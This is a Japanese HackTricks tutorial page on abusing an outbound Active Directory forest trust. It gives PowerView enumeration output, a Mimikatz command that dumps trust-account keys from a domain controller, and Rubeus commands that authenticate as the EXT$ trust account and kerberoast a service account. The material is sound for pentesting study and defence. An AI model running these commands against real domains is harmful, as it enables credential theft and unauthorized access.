# 外部フォレストドメイン - 片方向（アウトバウンド）

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

このシナリオでは、**あなたのドメイン**が**異なるドメイン**のプリンシパルに対していくつかの**権限**を**信頼**しています。

## 列挙

### アウトバウンドトラスト
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## トラストアカウント攻撃

Active Directory ドメインまたはフォレストトラストがドメイン _B_ からドメイン _A_ へ設定されるとき（_**B**_ が A を信頼）、ドメイン **A** に **B. Kerberos trust keys** という名前のトラストアカウントが作成されます。これらは、ドメイン A のユーザーがドメイン B のサービスに対するサービスチケットを要求する際に、**相互レルム TGT の暗号化**に使用される、**トラストアカウントのパスワード**から派生したものです。

ドメインコントローラを使用して、信頼されたアカウントのパスワードとハッシュを取得することが可能です：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
リスクは、信頼アカウントB$が有効になっているため、**B$のプライマリグループがドメインAのドメインユーザーである**ことにあります。ドメインユーザーに付与された権限はB$にも適用され、B$の資格情報を使用してドメインAに対して認証することが可能です。

{% hint style="warning" %}
したがって、**信頼しているドメインから信頼されているドメイン内のユーザーを取得することが可能です**。このユーザーは多くの権限を持っていないかもしれません（おそらくドメインユーザーのみ）が、**外部ドメインを列挙する**ことができます。
{% endhint %}

この例では、信頼しているドメインは`ext.local`で、信頼されているドメインは`root.local`です。したがって、`root.local`内に`EXT$`というユーザーが作成されます。
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
したがって、この時点で **`root.local\EXT$`** の現在の**クリアテキストパスワードとKerberos秘密鍵**を持っています。**`root.local\EXT$`** のKerberos AES秘密鍵は異なるソルトが使用されるためAESトラストキーとは同一ではありませんが、**RC4キーは同じです**。したがって、ext.localからダンプされた**RC4トラストキーを使用して**、`root.local\EXT$` として `root.local` に対して**認証**することができます。
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
この方法を使えば、そのドメインの列挙を開始し、さらにユーザーに対してkerberoastingを行うことができます。
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### クリアテキスト信頼パスワードの収集

前のフローでは、**クリアテキストパスワード**（**mimikatzによってダンプされた**）の代わりに信頼ハッシュを使用しました。

クリアテキストパスワードは、mimikatzの\[ CLEAR ]出力を16進数から変換し、ヌルバイト '\x00' を削除することで取得できます：

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

信頼関係を作成する際には、ユーザーが信頼のためのパスワードを入力する必要があります。このデモンストレーションでは、キーは元の信頼パスワードであり、したがって人間が読める形式です。キーがサイクルする（30日ごと）と、クリアテキストは人間が読める形式ではなくなりますが、技術的にはまだ使用可能です。

クリアテキストパスワードは、信頼アカウントのKerberos秘密鍵を使用してTGTを要求する代わりに、信頼アカウントとして通常の認証を実行するために使用できます。ここでは、ext.localからroot.localに対してDomain Adminsのメンバーを照会しています：

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## 参考文献

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>
